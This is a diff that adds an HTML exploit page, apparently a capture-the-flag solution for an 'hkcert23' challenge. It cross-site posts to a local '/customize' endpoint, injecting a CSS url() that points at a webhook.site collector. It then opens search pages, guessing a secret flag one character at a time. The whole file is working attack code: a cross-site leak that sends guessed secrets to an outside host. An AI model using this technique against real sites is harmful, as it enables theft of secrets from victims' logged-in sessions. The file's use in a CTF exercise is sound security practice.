@@ -1,0 +1,21 @@
+<form action="http://localhost:3000/customize" method="POST" target="x">
+	<input id="z" name="style" type="submit">
+</form>
+<script>
+	url = "https://webhook.site/66cbf4b1-e0ba-4273-8692-e74298c99933/?";
+	const sleep = ms => new Promise(r => setTimeout(r, ms));
+	charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}";
+	//charset = "ACDEILNOPRST23_}"; //the initial charset search seems missing the zero
+	async function q(){
+		prefix = "hkcert23{LOST_IN_PARADISE__SECCON2023_"; //prefix = "hkcert23{"
+		for(i=0;i<charset.length;i++){
+			c = charset[i];
+			z.value="url("+url+prefix+c+")";
+			z.click();
+			await sleep(1000);
+			open("http://localhost:3000/search?q="+prefix+c,"x");
+			await sleep(1000);
+		}
+	}
+	q();
+</script>
